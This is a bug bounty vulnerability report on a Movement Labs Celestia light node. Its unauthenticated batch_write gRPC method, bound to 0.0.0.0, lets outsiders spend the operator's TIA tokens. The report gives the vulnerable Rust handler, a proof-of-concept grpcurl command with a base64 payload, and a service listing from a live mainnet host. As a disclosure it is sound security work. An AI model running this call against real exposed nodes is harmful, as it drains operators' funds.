# #43241 \[BC-High] Attackers can drain TIA from nodes in networks running in passthrough mode

**Submitted on Apr 4th 2025 at 01:29:32 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43241
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

The `batch_write` rpc call can be abused by attackers to write arbitrary data to the Celestia network. Anyone running the DA Light Node is at risk.

## Vulnerability Details

The `batch_write` RPC method does not have access control. Further, the LightNodeService is bound to the ip address `0.0.0.0` in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC to write arbitrary data to the Celestia network. Each time this is done the node operator spends TIA tokens to persist this data

## Impact Details

Node operators face direct loss of funds (TIA).

## References

`protocol-units/da/movement/protocol/light-node/src/passthrough.rs`

```
	async fn batch_write(
		&self,
		request: tonic::Request<BatchWriteRequest>,
	) -> std::result::Result<tonic::Response<BatchWriteResponse>, tonic::Status> {
		let blobs = request.into_inner().blobs;
		for data in blobs {
			let blob = InnerSignedBlobV1Data::now(data.data)
				.try_to_sign(&self.signer)
				.await
				.map_err(|e| tonic::Status::internal(format!("Failed to sign blob: {}", e)))?;
			self.da
				.submit_blob(blob.into())
				.await
				.map_err(|e| tonic::Status::internal(e.to_string()))?;
		}

		// * We are currently not returning any blobs in the response.
		Ok(tonic::Response::new(BatchWriteResponse { blobs: vec![] }))
	}
```

## Proof of Concept

## Proof of Concept

* Run a node in passthrough mode
* Call this node's batch\_write RPC method from another host:
  * `grpcurl -v -plaintext -d '{"blobs":[{"data":"eyJkYXRhIjpbMF0sImFwcGxpY2F0aW9uX3ByaW9yaXR5IjowLCJzZXF1ZW5jZV9udW1iZXIiOjAsImlkIjpbMTU3LDIxLDU1LDQzLDI0LDQ4LDExNSw5MCwxMCw0NSw1LDMzLDcwLDEwNSwyMjcsMzksMjYsMTE3LDc0LDE3Miw3MCwyNTQsNDgsNTksMTA0LDE4Nyw0OCw3MCwxLDU4LDUsMTEwXX0K"}]}' localhost:30730 movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService/BatchWrite` (this can be expanded to several megabytes of data at one time)
* The node unconditionally submits this to Celestia to be written, paying for the cost.

The live Movement mainnet exposes this service as seen here:

```
$ grpcurl m1-da-light-node.mainnet.movementnetwork.xyz:443 list movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.BatchRead
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.BatchWrite
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.ReadAtHeight
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamReadFromHeight
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamReadLatest
movementlabs.protocol_units.da.light_node.v1beta2.LightNodeService.StreamWriteBlob
```
